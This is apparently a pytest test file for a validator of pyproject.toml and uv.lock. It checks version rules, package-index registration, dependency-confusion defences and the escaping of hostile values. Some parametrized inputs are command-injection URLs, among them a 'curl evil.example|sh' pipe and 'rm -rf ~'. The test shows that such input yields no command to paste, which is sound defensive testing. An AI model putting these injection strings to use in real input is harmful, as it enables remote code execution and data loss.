"""`pyproject.toml` and `uv.lock` validation for projects with Python assets."""

from __future__ import annotations

import hashlib
import shlex
import sys

import pytest

from lakana_core.projects.issues import ProjectIssue
from lakana_core.projects.lockfile import (
    LOCK_FILE,
    PYPROJECT_FILE,
    lock_digest,
    lockfile_issues,
    python_admitted,
    source_issues,
    task_interpreter,
    used_indexes,
    versions_compatible,
)
from lakana_core.projects.package_sources import KnownSources, RegisteredIndex

_PYPROJECT = '[project]\nname = "demo"\nversion = "0.1.0"\nrequires-python = ">=3.11"\n'


def _lock(*packages: tuple[str, str], requires_python: str | None = ">=3.11") -> bytes:
    """Build a minimal `uv.lock`.

    Parameters
    ----------
    *packages
        ``(name, version)`` pairs.
    requires_python
        The top-level specifier, or `None` to leave it out.

    Returns
    -------
    bytes
        The lock file.
    """
    lines = ["version = 1"]
    if requires_python is not None:
        lines.append(f'requires-python = "{requires_python}"')
    for name, version in packages:
        lines += ["", "[[package]]", f'name = "{name}"', f'version = "{version}"']
    return ("\n".join(lines) + "\n").encode()


_PYPI_SOURCE = 'source = { registry = "https://pypi.org/simple" }\n'
_GOOD = _lock(("demo", "0.1.0"), ("lakana", "0.8.3"), ("polars", "1.44.2"))


def _messages(pyproject: str | None, lock: bytes | None, **kwargs: object) -> list[str]:
    """Run the validation with the defaults of a 0.8 worker on Python 3.13.

    Parameters
    ----------
    pyproject
        `pyproject.toml`'s text.
    lock
        `uv.lock`'s bytes.
    **kwargs
        Overrides of `platform_version`, `python`, `sources` and `deploying`.

    Returns
    -------
    list of str
        Rendered issues.
    """
    options: dict[str, object] = {
        "platform_version": "0.8.0",
        "python": (3, 13, 1),
        "sources": KnownSources(),
    }
    options.update(kwargs)
    deploying = options.pop("deploying", True) is True
    issues = lockfile_issues(
        pyproject,
        lock,
        deploying=deploying,
        **options,  # ty: ignore[invalid-argument-type]
    )
    return [issue.render() for issue in issues]


def test_a_good_project_has_no_issues() -> None:
    assert _messages(_PYPROJECT, _GOOD) == []


def test_lock_digest_hashes_the_raw_bytes() -> None:
    assert lock_digest(b"a\r\nb") == hashlib.sha256(b"a\r\nb").hexdigest()


def test_missing_files() -> None:
    assert lockfile_issues(
        None, None, platform_version="0.8.0", python=(3, 13, 1), sources=KnownSources()
    ) == [
        ProjectIssue(
            PYPROJECT_FILE,
            None,
            "a project with Python assets needs a pyproject.toml at the repository root",
        ),
        ProjectIssue(
            LOCK_FILE, None, "a project with Python assets needs a committed uv.lock; run `uv lock`"
        ),
    ]


@pytest.mark.parametrize(
    ("pyproject", "lock", "fragment"),
    [
        ("[project\n", _GOOD, "pyproject.toml: is not valid TOML"),
        (_PYPROJECT, b"version = \n", "uv.lock: is not valid TOML"),
        (_PYPROJECT, b"\xff\xfe", "uv.lock: is not valid UTF-8"),
        (_PYPROJECT, b'package = "x"\n', "uv.lock: does not contain lakana"),
        (_PYPROJECT, b"package = [1, 2]\n", "uv.lock: does not contain lakana"),
        (
            _PYPROJECT,
            b'[[package]]\nname = "lakana"\n',
            "uv.lock: lakana has no locked version (editable or workspace source)",
        ),
        (_PYPROJECT, _lock(("polars", "1.44.2")), "uv.lock: does not contain lakana"),
        (_PYPROJECT, _lock(("lakana", "0.8.3")), "uv.lock: does not contain polars"),
        (
            _PYPROJECT,
            _lock(("lakana", "0.7.9"), ("polars", "1.44.2")),
            "uv.lock: has lakana 0.7.9, but this instance runs 0.8.0",
        ),
        (
            _PYPROJECT,
            _lock(("lakana", "0.8.3"), ("polars", "1.44.2"), requires_python=">=3.14"),
            "requires-python '>=3.14' does not admit the worker's Python 3.13.1",
        ),
        (
            _PYPROJECT,
            _lock(("lakana", "0.8.3"), ("polars", "1.44.2"), requires_python=">=3.11; x"),
            "requires-python '>=3.11\\x3b x' cannot be evaluated",
        ),
    ],
)
def test_refused_projects(pyproject: str, lock: bytes, fragment: str) -> None:
    messages = _messages(pyproject, lock)
    assert any(fragment in message for message in messages), messages


def test_the_rule_is_named_for_the_platform_version() -> None:
    lock = _lock(("lakana", "2.0.0"), ("polars", "1.44.2"))
    (after,) = _messages(_PYPROJECT, lock, platform_version="1.2.0")
    assert "the major versions must match" in after
    (before,) = _messages(_PYPROJECT, lock)
    assert "before 1.0 the minor versions must match" in before


def test_requires_python_falls_back_to_pyproject() -> None:
    lock = _lock(("lakana", "0.8.3"), ("polars", "1.44.2"), requires_python=None)
    assert _messages(_PYPROJECT, lock) == []
    assert _messages(_PYPROJECT.replace(">=3.11", ">=3.14"), lock) == [
        "uv.lock: requires-python '>=3.14' does not admit the worker's Python 3.13.1"
    ]
    assert _messages('[project]\nname = "demo"\n', lock) == []
    assert _messages('project = "odd"\n', lock) == []


def test_a_hostile_version_is_escaped() -> None:
    lock = _lock(("lakana", "0.7.0\\u001b[31m"), ("polars", "1"))
    (message,) = _messages(_PYPROJECT, lock)
    assert "\x1b" not in message


def test_a_hostile_specifier_is_escaped() -> None:
    lock = _lock(("lakana", "0.8.3"), ("polars", "1"), requires_python=">=3.11\\u001b[31m")
    (message,) = _messages(_PYPROJECT, lock)
    assert "\x1b" not in message
    assert "cannot be evaluated" in message


def test_huge_values_end_as_short_issues() -> None:
    huge = "9" * 100_000
    lock = _lock(("lakana", huge + ".0.0"), ("polars", "1"), requires_python=">=" + huge)
    messages = _messages(_PYPROJECT, lock)
    assert len(messages) == 2
    assert all(len(message) < 1000 for message in messages)
    lock = _lock(("lakana", "0.8.0"), ("polars", "1"), requires_python="," * 5 + "x" * 100_000)
    (message,) = _messages(_PYPROJECT, lock)
    assert len(message) < 1000


def test_a_huge_platform_version_is_not_an_exception() -> None:
    assert versions_compatible("0.8.0", "9" * 100_000 + ".1") is False


def test_a_long_toml_error_is_shortened() -> None:
    (message,) = _messages("a = " + "[" * 5000 + "\n", _GOOD)
    assert len(message) < 1000
    (message,) = _messages(_PYPROJECT, ("a = " + "[" * 5000 + "\n").encode())
    assert len(message) < 1000


def test_wrong_types_are_not_exceptions() -> None:
    lock = b'requires-python = 3\n[[package]]\nname = ["lakana"]\nversion = 7\n'
    assert any("does not contain lakana" in m for m in _messages("project = 1\n", lock))
    project = '[project]\nrequires-python = ["x"]\n'
    assert (
        _messages(project, _lock(("lakana", "0.8.0"), ("polars", "1"), requires_python=None)) == []
    )


@pytest.mark.parametrize(
    ("lock_version", "platform", "expected"),
    [
        ("0.8.0", "0.8.0", True),
        ("0.8.3", "0.8.0", True),
        ("0.8.3", "0.8.1.dev3+g1a2b3c4", True),
        ("0.9.0", "0.8.0", False),
        ("0.7.9", "0.8.0", False),
        ("1.4.0", "1.0.2", True),
        ("1.0.0", "1.9.0", True),
        ("2.0.0", "1.9.0", False),
        ("0.9.0", "1.0.0", False),
        ("1.0.0", "0.9.0", False),
        ("0+unknown", "0+unknown", True),
        ("0.8.0", "0+unknown", False),
        ("weird", "0.8.0", False),
        ("٨.٨.0", "0.8.0", False),
    ],
)
def test_versions_compatible(lock_version: str, platform: str, expected: bool) -> None:
    assert versions_compatible(lock_version, platform) is expected


@pytest.mark.parametrize(
    ("specifier", "expected"),
    [
        ("", True),
        (">=3.11", True),
        (">=3.13.1", True),
        (">=3.13.2", False),
        (">3.13", True),
        (">3.13.1", False),
        ("<3.14", True),
        ("<3.13", False),
        ("<=3.13.1", True),
        ("<=3.13", False),
        ("==3.13.1", True),
        ("==3.13", False),
        ("==3.13.*", True),
        ("==3.12.*", False),
        ("!=3.13.*", False),
        ("!=3.12.*", True),
        ("!=3.13.1", False),
        ("~=3.11", True),
        ("~=3.13.0", True),
        ("~=3.12.0", False),
        (">=3.11, <3.14", True),
        (">=3.11,<3.13", False),
        (">= 3.11", True),
        (">=3.13.1.0", True),
        ("~=3", None),
        (">=3.*", None),
        ("===3.13", None),
        (">=3.11; python_version", None),
        (">=3.11,", None),
        (",", None),
        (">=3.11,,<3.14", None),
        ("   ", True),
        ("<3.13, nonsense", None),
        (">=" + "9" * 5000, None),
        (">=٣.11", None),
    ],
)
def test_python_admitted(specifier: str, expected: bool | None) -> None:
    assert python_admitted(specifier, (3, 13, 1)) is expected


def test_a_huge_integer_is_an_issue_not_a_value_error() -> None:
    digits = ("a = " + "9" * 5000 + "\n").encode()
    (message,) = _messages(_PYPROJECT, digits)[:1]
    assert message.startswith("uv.lock: is not valid TOML") and len(message) < 1000
    (message,) = _messages("a = " + "9" * 5000 + "\n", _GOOD)
    assert message.startswith("pyproject.toml: is not valid TOML") and len(message) < 1000


def test_every_lakana_entry_must_be_compatible() -> None:
    lock = _lock(("lakana", "0.1.0"), ("lakana", "0.8.3"), ("polars", "1"))
    (message,) = _messages(_PYPROJECT, lock)
    assert "has lakana 0.1.0" in message
    lock = _lock(("lakana", "0.8.3"), ("lakana", "0.1.0"), ("polars", "1"))
    (message,) = _messages(_PYPROJECT, lock)
    assert "has lakana 0.1.0" in message
    lock = _lock(("lakana", "0.8.1"), ("lakana", "0.8.3"), ("polars", "1"))
    assert _messages(_PYPROJECT, lock) == []


def test_a_versionless_lakana_entry_is_its_own_issue() -> None:
    lock = _lock(("polars", "1")) + b'\n[[package]]\nname = "lakana"\nsource = { editable = "." }\n'
    (message,) = _messages(_PYPROJECT, lock)
    assert "lakana has no locked version" in message
    assert "depend on the released package" in message


_LOCAL = "local path and workspace dependencies are not supported"


@pytest.mark.parametrize(
    "source",
    [
        '{ path = "vendor/helper-1.0-py3-none-any.whl" }',
        '{ directory = "vendor/helper" }',
        '{ editable = "packages/helper" }',
        '{ virtual = "packages/helper" }',
    ],
)
def test_a_local_source_other_than_the_root_is_refused(source: str) -> None:
    lock = _GOOD + f'\n[[package]]\nname = "helper"\nversion = "1"\nsource = {source}\n'.encode()
    (message,) = _messages(_PYPROJECT, lock)
    assert message.startswith(f"uv.lock: {_LOCAL}")
    assert "helper" in message and "importable from the repository root" in message


def test_the_root_project_passes() -> None:
    lock = _GOOD + (
        b'\n[[package]]\nname = "demo"\nversion = "0.1.0"\nsource = { virtual = "." }\n'
        b'dependencies = [{ name = "lakana" }]\n'
        b"\n[[package]]\nname = 'd'\n"
    )
    assert _messages(_PYPROJECT, lock) == []


def test_a_hostile_local_package_name_is_escaped() -> None:
    lock = _GOOD + b'\n[[package]]\nname = "ev\\u001bil"\nsource = { path = "x" }\n'
    (message,) = _messages(_PYPROJECT, lock)
    assert "\x1b" not in message and "ev\\x1bil" in message


def test_a_local_package_without_a_name_is_still_refused() -> None:
    lock = _GOOD + b"\n[[package]]\nname = 7\nsource = { path = 'x' }\n"
    (message,) = _messages(_PYPROJECT, lock)
    assert "(?)" in message


def test_only_three_local_packages_are_named() -> None:
    extra = "".join(f'\n[[package]]\nname = "h{i}"\nsource = {{ path = "x" }}\n' for i in range(5))
    (message,) = _messages(_PYPROJECT, _GOOD + extra.encode())
    assert "(h0, h1, h2, ...)" in message


@pytest.mark.parametrize(
    "extra",
    [
        '{ directory = "." }',
        '{ editable = "." }',
        '{ virtual = "." }',
        '{ path = "." }',
    ],
)
def test_a_second_package_with_a_root_source_is_refused(extra: str) -> None:
    lock = (
        _GOOD
        + b'\n[[package]]\nname = "demo"\nsource = { virtual = "." }\n'
        + f'\n[[package]]\nname = "second"\nsource = {extra}\n'.encode()
    )
    (message,) = _messages(_PYPROJECT, lock)
    assert message.startswith(f"uv.lock: {_LOCAL}") and "second" in message


@pytest.mark.parametrize("source", ['"."', '["."]', "7"])
def test_a_source_that_is_not_a_table_is_refused(source: str) -> None:
    lock = _GOOD + f'\n[[package]]\nname = "odd"\nsource = {source}\n'.encode()
    (message,) = _messages(_PYPROJECT, lock)
    assert message.startswith(f"uv.lock: {_LOCAL}") and "odd" in message


def _project_lock(
    *, dependencies: str = "", groups: str = "", extras: str = "", more: str = ""
) -> bytes:
    """Build a `uv.lock` with a root package, as `uv lock` writes one.

    Parameters
    ----------
    dependencies
        TOML lines of the root's `dependencies` list items.
    groups
        TOML lines under `[package.dev-dependencies]`.
    extras
        TOML lines under `[package.optional-dependencies]`.
    more
        Further `[[package]]` tables, as text.

    Returns
    -------
    bytes
        The lock file.
    """
    root = ["[[package]]", 'name = "demo"', 'version = "0.1.0"', 'source = { virtual = "." }']
    if dependencies:
        root += ["dependencies = [", dependencies, "]"]
    if extras:
        root += ["", "[package.optional-dependencies]", extras]
    if groups:
        root += ["", "[package.dev-dependencies]", groups]
    packages = (
        '[[package]]\nname = "lakana"\nversion = "0.8.3"\n'
        + _PYPI_SOURCE
        + 'dependencies = [\n    { name = "polars" },\n]\n\n'
        + '[[package]]\nname = "polars"\nversion = "1.44.2"\n'
        + _PYPI_SOURCE
    )
    text = 'version = 1\nrequires-python = ">=3.11"\n\n' + "\n".join(root) + "\n\n" + packages
    return (text + "\n" + more).encode()


_LAKANA_NOT_INSTALLED = (
    "uv.lock: lakana is locked, but no task installs it: it is only in a dependency group or an "
    "extra, not in the project's own dependencies; add `lakana[assets]` to `[project] "
    "dependencies` in pyproject.toml, run `uv lock`, commit and deploy again"
)


def test_lakana_in_the_projects_own_dependencies_is_installed() -> None:
    lock = _project_lock(dependencies='    { name = "lakana", extra = ["assets"] },')
    assert _messages(_PYPROJECT, lock) == []


def test_lakana_reached_through_another_dependency_is_installed() -> None:
    lock = _project_lock(
        dependencies='    { name = "plugin" },',
        more=(
            '[[package]]\nname = "plugin"\nversion = "1"\n'
            + _PYPI_SOURCE
            + 'dependencies = [\n    { name = "lakana" },\n]\n'
        ),
    )
    assert _messages(_PYPROJECT, lock) == []


def test_lakana_only_in_a_dependency_group_is_refused() -> None:
    lock = _project_lock(groups='dev = [\n    { name = "lakana", extra = ["assets"] },\n]')
    assert _messages(_PYPROJECT, lock) == [_LAKANA_NOT_INSTALLED]


def test_lakana_only_in_an_extra_of_the_project_is_refused() -> None:
    lock = _project_lock(extras='assets = [\n    { name = "lakana" },\n]')
    assert _messages(_PYPROJECT, lock) == [_LAKANA_NOT_INSTALLED]


def test_a_lock_without_an_identifiable_root_is_not_refused_for_it() -> None:
    assert _messages(_PYPROJECT, _GOOD) == []
    twin = _project_lock(
        more='[[package]]\nname = "other"\nversion = "1"\nsource = { virtual = "." }\n'
    )
    assert _LAKANA_NOT_INSTALLED not in _messages(_PYPROJECT, twin)


def test_the_walk_follows_extras_of_reached_packages_and_survives_odd_entries() -> None:
    """A diamond, an unnamed package and an extra of a dependency all leave lakana installed."""
    lock = _project_lock(
        dependencies='    { name = "left" },\n    { name = "right" },',
        more=(
            '[[package]]\nname = "left"\nversion = "1"\n'
            'dependencies = [\n    { name = "base" },\n]\n'
            '\n[[package]]\nname = "right"\nversion = "1"\n'
            'dependencies = [\n    { name = "base" },\n]\n'
            '\n[[package]]\nname = "base"\nversion = "1"\n'
            "\n[package.optional-dependencies]\nsdk = [\n"
            '    { name = "lakana" },\n    "not a table",\n]\n'
            "\n[[package]]\nname = 7\nversion = '1'\n"
        ),
    )
    assert _messages(_PYPROJECT, lock) == []


_TEAM = RegisteredIndex("team", "https://pkgs.example.org/simple", "team-index")
_SOURCES = KnownSources((_TEAM,), "https://op:hunter2@mirror.corp/simple/")


def _locked(*sources: str) -> bytes:
    """Build a lock that is fine but for its sources.

    Parameters
    ----------
    *sources
        One TOML value per extra package, written as that package's ``source``.

    Returns
    -------
    bytes
        The lock file; its packages are named ``p0``, ``p1`` and so on.
    """
    text = _GOOD.decode()
    for number, source in enumerate(sources):
        text += f'\n[[package]]\nname = "p{number}"\nversion = "1"\nsource = {source}\n'
    return text.encode()


@pytest.mark.parametrize(
    ("source", "issue"),
    [
        ('{ registry = "https://pypi.org/simple" }', None),
        ('{ registry = "https://pypi.org/simple/" }', None),
        ('{ registry = "wheelhouse" }', None),
        ('{ registry = "./wheelhouse/" }', None),
        ('{ registry = "https://mirror.corp/simple" }', None),
        ('{ registry = "https://pkgs.example.org/simple" }', None),
        (
            '{ registry = "https://evil.example/simple" }',
            "uv.lock: takes p0 from the package index https://evil.example/simple, which is not "
            "registered on this instance. Ask an administrator to register it (`lakana index add "
            "NAME --url https://evil.example/simple`), or take the package from a registered "
            "index (`lakana index list`), then run `uv lock`",
        ),
        (
            '{ registry = "vendor" }',
            "uv.lock: takes p0 from the local folder vendor; the only folder a lock may name is "
            "`wheelhouse` at the root of the project. Rename the folder or take the package from "
            "a package index, then run `uv lock`",
        ),
        (
            '{ git = "https://github.com/acme/tool?rev=1#abc" }',
            "uv.lock: takes p0 from a git repository, which is not supported. Publish the "
            "package to a package index, ask an administrator to register that index (`lakana "
            "index add`), then run `uv lock`",
        ),
        (
            '{ url = "https://files.example.org/tool-1.whl" }',
            "uv.lock: takes p0 from a direct URL, which is not supported. Publish the package "
            "to a package index, ask an administrator to register that index (`lakana index "
            "add`), then run `uv lock`",
        ),
    ],
)
def test_every_row_of_the_table(source: str, issue: str | None) -> None:
    """PyPI, `wheelhouse`, the operator's index and a registered index pass."""
    expected = [] if issue is None else [issue]
    assert _messages(_PYPROJECT, _locked(source), sources=_SOURCES) == expected


@pytest.mark.parametrize(
    "spelling",
    [
        "https://pkgs.example.org/simple",
        "https://pkgs.example.org/simple/",
        "https://PKGS.Example.org/simple",
        "https://pkgs.example.org:443/simple",
        "HTTPS://pkgs.example.org:443/simple//",
    ],
)
def test_a_lock_is_matched_whatever_the_spelling_of_the_index_url(spelling: str) -> None:
    """The registry stores one spelling, a lock may use another."""
    lock = _locked(f'{{ registry = "{spelling}" }}')
    assert _messages(_PYPROJECT, lock, sources=_SOURCES) == []
    assert used_indexes(lock, _SOURCES) == (_TEAM,)


@pytest.mark.parametrize(
    "other",
    [
        "https://pkgs.example.org/Simple",
        "https://pkgs.example.org/simple/team",
        "https://pkgs.example.org:8443/simple",
        "http://pkgs.example.org/simple",
        "https://pkgs.example.org.evil.example/simple",
        "https://reader:hunter2@pkgs.example.org/simple",
        "https://pkgs.example.org/simple?x=1",
        "https://pkgs.example.org/simple?token=hunter2",
        "https://pkgs.example.org/simple#hunter2",
        "https://rea der:hunter2@pkgs.example.org/simple",
        "https://reader:hun#ter2@pkgs.example.org/simple",
        "https://reader:hunter2@pkgs.example.org/simple?a=b@c",
        "https://pkgs.example.org\\.evil.example/simple",
        "https://pkgs.example.org\\@evil.example/simple",
        "https://pkgs%2eexample.org/simple",
        "https://%70kgs.example.org/simple",
        "https://pkgs.example.org/simple/../simple",
        "https://pkgs.example.org/simple/%2e%2e/simple",
        "https://pkgs.example.org/sim%70le",
        "https://pkgs.example.org//simple",
    ],
)
def test_a_url_that_only_resembles_a_registered_one_is_refused(other: str) -> None:
    """Another path, port, scheme or host is another index; a credential in a lock is masked.

    The URL rule of `comparable_index_url` refuses a URL with userinfo, a query, a fragment, a
    backslash, a percent sign or a dot segment: such a URL is no known source, never an error.
    """
    lock = _locked("{ registry = '" + other + "' }")
    (message,) = _messages(_PYPROJECT, lock, sources=_SOURCES)
    assert (
        "which is not registered on this instance" in message
        or "cannot be registered as written" in message
    )
    shown = message.split(" cannot be registered")[0]
    assert "ter2" not in message and "?" not in shown and "#" not in shown
    assert used_indexes(lock, _SOURCES) == ()
    assert [issue.render() for issue in source_issues(_PYPROJECT, lock, _SOURCES)] == [message]


@pytest.mark.parametrize(
    ("written", "shown"),
    [
        ("https://reader:hunter2@host.example/simple", "https://***@host.example/simple"),
        ("https://host.example/simple?token=hunter2", "https://host.example/simple"),
        ("https://host.example/simple#frag", "https://host.example/simple"),
        ("https://host.example/simple?a=1#frag", "https://host.example/simple"),
        ("https://u:p#q@host.example/simple", "https://***@host.example/simple"),
        ("https://reader:hunter2@host.example/a@b/simple", "https://***@host.example/a@b/simple"),
        ("https://reader:hunter2@host.example/simple?a=b@c", "https://***@host.example/simple"),
        ("https://user:p/w@host.example/simple", "https://***@host.example/simple"),
        ("https://user:p?w@host.example/simple", "https://***@host.example/simple"),
    ],
)
def test_the_url_shown_in_a_message_has_no_userinfo_query_or_fragment(
    written: str, shown: str
) -> None:
    """R3.1: what a lock URL carries after the path never reaches a message."""
    (message,) = _messages(_PYPROJECT, _locked(f'{{ registry = "{written}" }}'), sources=_SOURCES)
    assert f"from the package index {shown}, which is not a registered package index" in message
    assert "cannot be registered as written" in message
    assert "lakana index add" not in message


def test_a_space_and_a_backtick_in_a_refused_url_are_written_as_escapes() -> None:
    """A message puts commands in backticks and joins issues with spaces: the URL must not break."""
    lock = _locked('{ registry = "https://host.example/a b`c`/simple" }')
    (message,) = _messages(_PYPROJECT, lock, sources=_SOURCES)
    assert "the package index https://host.example/a\\x20b\\x60c\\x60/simple, which" in message
    assert "/a b" not in message and "`c`" not in message


def test_many_packages_and_many_sources_are_reported_in_bounded_text() -> None:
    lock = _locked(
        *['{ registry = "https://a.example/simple" }'] * 5,
        '{ registry = "https://b.example/simple" }',
        '{ git = "https://g.example/x" }',
        "{ registry = 7 }",
    )
    messages = _messages(_PYPROJECT, lock, sources=_SOURCES)
    assert messages[0].startswith(
        "uv.lock: takes p0, p1, p2, ... from the package index https://a.example/simple,"
    )
    assert messages[1].startswith(
        "uv.lock: takes p5 from the package index https://b.example/simple,"
    )
    assert messages[2].startswith("uv.lock: takes p7 from the package index ?,")
    assert messages[3].startswith("uv.lock: takes p6 from a git repository,")
    assert len(messages) == 4


def test_a_hostile_package_name_or_url_is_escaped() -> None:
    lock = (
        _GOOD.decode()
        + '\n[[package]]\nname = "x\\u001b[31m"\nversion = "1"\n'
        + 'source = { registry = "https://evil.example/\\u202e" }\n'
    ).encode()
    (message,) = _messages(_PYPROJECT, lock, sources=_SOURCES)
    assert "\x1b" not in message and "\u202e" not in message
    assert "\\x1b[31m" in message
    assert "\\u202e" in message


def test_a_very_long_url_is_bounded_in_the_message() -> None:
    lock = _locked(f'{{ registry = "https://evil.example/{"a" * 5000}" }}')
    (message,) = _messages(_PYPROJECT, lock, sources=_SOURCES)
    assert len(message) < 600 and "..." in message


_DECLARED = (
    _PYPROJECT
    + '\n[[tool.uv.index]]\nname = "team"\nurl = "https://pkgs.example.org/simple/"\n{explicit}'
    + '\n[tool.uv.sources]\nteam-utils = {{ index = "team" }}\n'
)


def test_a_registered_index_must_be_declared_explicit() -> None:
    """The defence against dependency confusion when the author locks."""
    assert _messages(_DECLARED.format(explicit="explicit = true\n"), _GOOD, sources=_SOURCES) == []
    for explicit in ("", "explicit = false\n", 'explicit = "true"\n'):
        assert _messages(_DECLARED.format(explicit=explicit), _GOOD, sources=_SOURCES) == [
            "pyproject.toml: the index team (https://pkgs.example.org/simple/) is a registered "
            "package index and needs `explicit = true`, so that only the packages you name come "
            "from it. Add `explicit = true` to its `[[tool.uv.index]]` table and one line per "
            'package under `[tool.uv.sources]` (`PACKAGE = { index = "team" }`), then run '
            "`uv lock`"
        ]


def test_a_registered_name_with_another_url_is_refused() -> None:
    pyproject = (
        _PYPROJECT
        + '\n[[tool.uv.index]]\nname = "Team"\nurl = "https://other.example/simple"\n'
        + "explicit = true\n"
    )
    assert _messages(pyproject, _GOOD, sources=_SOURCES) == [
        "pyproject.toml: the index named Team points at https://other.example/simple, but the "
        "package index registered as team is https://pkgs.example.org/simple. Use the "
        "registered URL, or give your index another name, then run `uv lock`"
    ]


@pytest.mark.parametrize(
    "url",
    [
        "https://pkgs.example.org\\.evil.example/simple",
        "https://%70kgs.example.org/simple",
        "https://pkgs.example.org/simple/../x",
    ],
)
def test_a_registered_name_with_a_url_the_rule_refuses_is_a_mismatch_not_an_error(
    url: str,
) -> None:
    """A declared URL that is no known form never raises and never reaches a message raw."""
    pyproject = (
        _PYPROJECT + f"\n[[tool.uv.index]]\nname = \"team\"\nurl = '{url}'\n" + "explicit = true\n"
    )
    (message,) = _messages(pyproject, _GOOD, sources=_SOURCES)
    assert message.startswith("pyproject.toml: the index named team points at https://")
    assert "hunter2" not in message and "?token" not in message


_LAKANA_REGISTERED = KnownSources(
    (RegisteredIndex("Lakana", "https://pkgs.example.org/simple", "team-index"),), None
)


@pytest.mark.parametrize(
    "folder", ["wheelhouse", "./wheelhouse/", "../x", "vendor/wheels", "/srv/wheels"]
)
def test_a_folder_of_the_project_may_have_the_name_of_a_registered_index(folder: str) -> None:
    """The documented `pyproject.toml` calls its flat index `lakana`; the name may be registered."""
    pyproject = (
        _PYPROJECT
        + f'\n[[tool.uv.index]]\nname = "lakana"\nurl = "{folder}"\nformat = "flat"\n'
        + "explicit = true\n"
    )
    assert _messages(pyproject, _GOOD, sources=_LAKANA_REGISTERED) == []
    assert source_issues(pyproject, _GOOD, _LAKANA_REGISTERED) == []


@pytest.mark.parametrize(
    "url",
    [
        "https:/host.example/simple",
        "https:host.example/simple",
        "file:wheelhouse",
        "file:///abs/wheelhouse",
    ],
)
def test_a_url_with_a_colon_is_no_folder_and_a_registered_name_is_refused(url: str) -> None:
    """Uv reads `https:/host/x` as `https://host/x`; only a value without a colon is a folder."""
    pyproject = (
        _PYPROJECT
        + f'\n[[tool.uv.index]]\nname = "lakana"\nurl = "{url}"\nformat = "flat"\n'
        + "explicit = true\n"
    )
    (message,) = _messages(pyproject, _GOOD, sources=_LAKANA_REGISTERED)
    assert message.startswith("pyproject.toml: the index named lakana points at ")
    assert (
        ", but the package index registered as Lakana is https://pkgs.example.org/simple" in message
    )


def test_the_name_of_a_registered_index_is_checked_at_a_deploy_only() -> None:
    """A deployed project does not stop because an administrator later registered its name."""
    pyproject = (
        _PYPROJECT
        + '\n[[tool.uv.index]]\nname = "lakana"\nurl = "https://other.example/simple"\n'
        + "explicit = true\n"
    )
    assert _messages(pyproject, _GOOD, sources=_LAKANA_REGISTERED) == [
        "pyproject.toml: the index named lakana points at https://other.example/simple, but the "
        "package index registered as Lakana is https://pkgs.example.org/simple. Use the "
        "registered URL, or give your index another name, then run `uv lock`"
    ]
    assert _messages(pyproject, _GOOD, sources=_LAKANA_REGISTERED, deploying=False) == []
    assert source_issues(pyproject, _GOOD, _LAKANA_REGISTERED) == []


def test_the_other_rules_for_a_registered_index_hold_before_an_execution_too() -> None:
    undeclared = _DECLARED.format(explicit="")
    plain = _PYPROJECT + '\n[tool.uv]\nindex-url = "https://pkgs.example.org/simple"\n'
    for pyproject in (undeclared, plain):
        at_deploy = _messages(pyproject, _GOOD, sources=_SOURCES)
        assert len(at_deploy) == 1
        assert _messages(pyproject, _GOOD, sources=_SOURCES, deploying=False) == at_deploy
        assert [issue.render() for issue in source_issues(pyproject, _GOOD, _SOURCES)] == at_deploy


@pytest.mark.parametrize(
    "setting",
    [
        'index-url = "https://pkgs.example.org/simple"',
        'extra-index-url = ["https://pypi.org/simple", "https://PKGS.example.org/simple/"]',
    ],
)
def test_a_registered_index_as_a_plain_index_url_is_refused(setting: str) -> None:
    key = setting.split(" ", 1)[0]
    assert _messages(_PYPROJECT + f"\n[tool.uv]\n{setting}\n", _GOOD, sources=_SOURCES) == [
        f"pyproject.toml: `{key}` names the registered package index team. Declare it as a "
        "`[[tool.uv.index]]` table with `explicit = true` instead, and name its packages under "
        "`[tool.uv.sources]`, then run `uv lock`"
    ]


def test_declarations_that_do_not_concern_a_registered_index_pass() -> None:
    pyproject = (
        _PYPROJECT
        + '\n[tool.uv]\nextra-index-url = ["https://pypi.org/simple"]\nindex-url = 3\n'
        + '\n[[tool.uv.index]]\nname = "lakana"\nurl = "wheelhouse"\nformat = "flat"\n'
        + "\n[[tool.uv.index]]\nurl = 5\n"
        + "\n[[tool.uv.index]]\n"
    )
    assert _messages(pyproject, _GOOD, sources=_SOURCES) == []
    for odd in (
        '[tool]\nuv = "x"\n',
        "tool = 3\n",
        '[tool.uv]\nindex = "x"\n',
        '[tool.uv]\nindex = ["x"]\n',
    ):
        assert _messages(_PYPROJECT + "\n" + odd, _GOOD, sources=_SOURCES) == []


def test_source_issues_alone_and_used_indexes_tolerate_broken_files() -> None:
    """`lockfile_issues` reports a file that cannot be parsed; these two just find nothing."""
    bad_source = _locked('{ registry = "https://evil.example/simple" }')
    assert [
        issue.render() for issue in source_issues(_PYPROJECT, bad_source, _SOURCES)
    ] == _messages(_PYPROJECT, bad_source, sources=_SOURCES)
    for pyproject, lock in ((None, None), ("= =", b"= ="), (_PYPROJECT, b"\xff\xfe")):
        assert source_issues(pyproject, lock, _SOURCES) == []
        assert used_indexes(lock, _SOURCES) == ()
    two = _locked(
        '{ registry = "https://pkgs.example.org/simple" }',
        '{ registry = "https://pkgs.example.org/simple/" }',
        '{ registry = "https://pypi.org/simple" }',
        "3",
    )
    assert used_indexes(two, _SOURCES) == (_TEAM,)
    assert used_indexes(two, KnownSources()) == ()


def test_a_lock_may_take_packages_from_testpypi_once_it_is_registered() -> None:
    """TestPyPI is no known source by itself, and it can be registered (without a credential)."""
    lock = _locked('{ registry = "https://test.pypi.org/simple" }')
    assert _messages(_PYPROJECT, lock) == [
        "uv.lock: takes p0 from the package index https://test.pypi.org/simple, which is not "
        "registered on this instance. Ask an administrator to register it (`lakana index add "
        "NAME --url https://test.pypi.org/simple`), or take the package from a registered index "
        "(`lakana index list`), then run `uv lock`"
    ]
    registered = KnownSources((RegisteredIndex("testpypi", "https://test.pypi.org/simple"),), None)
    assert _messages(_PYPROJECT, lock, sources=registered) == []


@pytest.mark.parametrize(
    "hostile",
    [
        "https://evil.example/$(id)",
        "https://evil.example/`id`",
        "https://evil.example/s;curl${IFS}evil.example|sh;#",
        "https://e.example/ x && rm -rf ~",
        "http://mirror.corp/simple",
        "https://pkgs.example.org/%73imple",
        "https://evil.example/a b",
        "https://h.example:8443/feed@view/s?x=1",
    ],
)
def test_a_url_that_cannot_be_registered_comes_with_no_command_to_paste(hostile: str) -> None:
    """I2: the administrator reads this message with a shell at hand."""
    lock = _locked("{ registry = '" + hostile + "' }")
    (message,) = _messages(_PYPROJECT, lock, sources=_SOURCES)
    assert "lakana index add" not in message
    assert "ask an administrator" not in message.casefold()
    assert (
        "is not a registered package index, and this URL cannot be registered as written" in message
    )
    assert "`lakana index list`" in message


